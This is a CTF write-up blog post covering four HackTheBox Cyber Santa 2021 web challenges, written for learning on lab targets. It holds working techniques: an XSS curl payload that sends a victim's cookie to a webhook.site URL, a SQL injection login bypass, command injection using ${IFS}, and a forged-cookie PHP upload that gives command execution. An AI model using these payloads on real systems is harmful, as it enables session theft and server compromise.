---
layout: post
current: post
cover: 'assets/images/htbcybersanta21/cover.png'
navigation: True
title: "HTB Cyber Santa CTF Web Write Up"
date: 2021-12-06 00:00:00
tags: [hackthebox, ctf]
class: post-template
subclass: 'post'
author: darryn
---
![cover](/assets/images/htbcybersanta21/cover.png)

### Overview

This writeup is for the web challenges from the [HackTheBox](https://www.hackthebox.com) Cyber Santa is Coming to Town CTF that took place from Wednesday 01 December to Sunday 05 December.

A big thank you to HTB for putting on a great event (as always). Check out their other CTF events at https://ctf.hackthebox.com. 

### Toy Workshop

The description for this challenge was: 

"The work is going well on Santa's toy workshop but we lost contact with the manager in charge! We suspect the evil elves have taken over the workshop, can you talk to the worker elves and find out?"

The challenge had both a docker instance to active and downloadable content.

Taking a look at the docker instance IP we get a simple web page. 

![workshop](/assets/images/htbcybersanta21/workshop.gif)

Rather than spend time poking around the website I took a look at the code provided.

In the routes/index.js file provides some additional paths, '/api/submit' and '/queries'.

```highlight
router.get('/', (req, res) => {
	return res.render('index');
});

router.post('/api/submit', async (req, res) => {

		const { query } = req.body;
		if(query){
			return db.addQuery(query)
				.then(() => {
					bot.readQueries(db);
					res.send(response('Your message is delivered successfully!'));
				});
		}
		return res.status(403).send(response('Please write your query first!'));
});

router.get('/queries', async (req, res, next) => {
	if(req.ip != '127.0.0.1') return res.redirect('/');

	return db.getQueries()
		.then(queries => {
			res.render('queries', { queries });
		})
		.catch(() => res.status(500).send(response('Something went wrong!')));
});
```

Two things jump out, the first the /api/submit page requires a POST request, if its accepted it will run 'bot.readQueries(db);'. Next the /queries page is only accessible from 127.0.0.1.

Taking a look at views/bot.js, the flag will be provided as a cookie and the readQueries function when called will set a cookie and call the queries page.

```highlight
const cookies = [{
	'name': 'flag',
	'value': 'HTB{f4k3_fl4g_f0r_t3st1ng}'
}];


const readQueries = async (db) => {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();
		await page.goto('http://127.0.0.1:1337/');
		await page.setCookie(...cookies);
		await page.goto('http://127.0.0.1:1337/queries', {
			waitUntil: 'networkidle2'
		});
		await browser.close();
		await db.migrate();
};
```

Next reviewing the views/queries.hbs page, It looks like the page iterates through the queries.

```highlight
        <p class="pb-3">Welcome back, admin!</p>
        <div class="dash-frame">
            {{#each queries}}
            <p>{{{this.query}}}</p>
            {{else}}
            <p class="empty">No content</p>
            {{/each}}
        </div>
```

So putting all this together I think we can use XSS to grab the cookie by sending a XSS payload in the API submit function. The cookie (flag) will be sent and the readQueries function will call the queries page, the XSS payload will fire and give our flag.

First I tested sending a simple POST request using curl and got a response.

```highlight
└──╼ $curl -X POST http://{{DOCKERIP}}:{{DOCKERPORT}}/api/submit --header 'Content-Type: application/json' -d '{"query":"test"}'
{"message":"Your message is delivered successfully!"}
```

I used https://webhook.site to generate a URL I could use in the XSS payload. I then changed the payload to use a script tag to call the web hook site along with the cookie.

```highlight
└──╼ $curl -X POST {{DOCKERIP}}:{{DOCKERPORT}}/api/submit --header 'Content-Type: application/json' -d '{"query":"><script>window.location='\''https://webho
ok.site/{{REDACTED}}/?c='\''.concat(document.cookie)</script>"}'
{"message":"Your message is delivered successfully!"}
```

On the webhook site was my request and the cookie.

### Toy Management

The description for Toy Management was:

"The evil elves have changed the admin access to Santa's Toy Management Portal. Can you get the access back and save the Christmas?"

Again with both a docker instance to start and downloadable content. This time its just a login form. I tried "admin'-- -" in the username field and "admin" as the password and got in and got the flag!

![toymanagement](/assets/images/htbcybersanta21/toymanagement.png)

### Gadget Santa

The description for Gadget Santa was:

"It seems that the evil elves have broken the controller gadget for the good old candy cane factory! Can you team up with the real red teamer Santa to hack back?"

Again this challenge had both a docker instance and downloadable content.

Looking at the webpage, I appears I can select options to print output from the system.

![gadgets](/assets/images/htbcybersanta21/gadgets.gif)

The URL has a command parameter: http://{{DOCKERIP}}:{{DOCKERPORT}}/?command=list_storage

So I tried some basic linux commands and I got output.

![commands](/assets/images/htbcybersanta21/commands.gif)

However, when ever I try and use a space I get no output. I can chain commands together using ```;``` but it still fails to show an output if I use a space.

![listfiles](/assets/images/htbcybersanta21/listfiles.gif)

Looking at the source, there is a sanitize function which removes spaces from the command.

```highlight
<?php
class MonitorModel
{   
    public function __construct($command)
    {
        $this->command = $this->sanitize($command);
    }

    public function sanitize($command)
    {   
        $command = preg_replace('/\s+/', '', $command);
        return $command;
    }

    public function getOutput()
    {
        return shell_exec('/santa_mon.sh '.$this->command);
    }
}
```

In a Python script shows the placeholder for the flag. The script is a web server running locally on port 3000. 

```highlight
def http_server(host_port,content_type="application/json"):
	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			def resp_ok():
				self.send_response(200)
				self.send_header("Content-type", content_type)
				self.end_headers()
			if self.path == '/':
				resp_ok()
				if check_service():
					self.wfile.write(get_json({'status': 'running'}))
				else:
					self.wfile.write(get_json({'status': 'not running'}))
				return
			elif self.path == '/restart':
				restart_service()
				resp_ok()
				self.wfile.write(get_json({'status': 'service restarted successfully'}))
				return
			elif self.path == '/get_flag':
				resp_ok()
				self.wfile.write(get_json({'status': 'HTB{f4k3_fl4g_f0r_t3st1ng}'}))
				return
			self.send_error(404, '404 not found')
		def log_message(self, format, *args):
			pass
	class _TCPServer(TCPServer):
		allow_reuse_address = True
	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()

http_server(('127.0.0.1',3000))
```

So I should be able to curl localhost:3000/get_flag to grab the flag. However I need to bypass the sanitization. To do this I can use ```${IFS}```. [HackTricks](https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions#bypass-forbidden-spaces) is a great resource for techniques like this.

So with the URL "http://{{DOCKERIP}}:{{DOCKERPORT}}/?command=;curl${IFS}localhost:3000/get_flag" I get the flag!

### Elf Directory

The description for Elf Directory was:

"Can you infiltrate the Elf Directory to get a foothold inside Santa's data warehouse in the North Pole?"

There is no downloadable content for this challenge just a docker instance to start.

Going to the docker instance IP and port shows a login page, unfortunately no simple SQL bypass this time.

![elfdirectory](/assets/images/htbcybersanta21/elfdirectory.png)

I tried some basic default credentials but had no luck so created an account with the username d4zs3c and logged in.

![loggedin](/assets/images/htbcybersanta21/loggedin.png)

There is a message:

"You don't have permission to edit your profile, contact the admin elf to approve your account!"

Now logged I checked the developer tools in Firefox and I have a PHPSESSID. I coped the cookie value and put it in [CyberChef](https://gchq.github.io) and used 'From Base64' operation.

![cookie](/assets/images/htbcybersanta21/cookie.png)

I removed the %3D which left with me ```{"username":"d4zs3c","approved":false}```.

Next I changed the input to ```{"username":"d4zs3c","approved":true}``` and used the 'To Base64'. Using the developer tools I removed the value up until the %3d and pasted in my new base64 string which looked like: "eyJ1c2VybmFtZSI6ImQ0enMzYyIsImFwcHJvdmVkIjp0cnVlfQ==%3D"

Now refreshing the page with my new cookie I get the option to upload a file.

![approved](/assets/images/htbcybersanta21/approved.png)

I tried to upload a PHP file but got an error:

"Invalid image. Only PNG images are supported."

So I downloaded an image of Santa (had to be) and tried to upload it but this time via Burp so I could modify it before its submitted. I appended the file name with .php and removed the contents of the file with a simple PHP script.

![uploadbypass](/assets/images/htbcybersanta21/uploadbypass.gif)

Now all I need to do is browse to the file and I will have command execution and can read the flag.

![commandinjection](/assets/images/htbcybersanta21/commandinjection.gif)

Thanks for reading!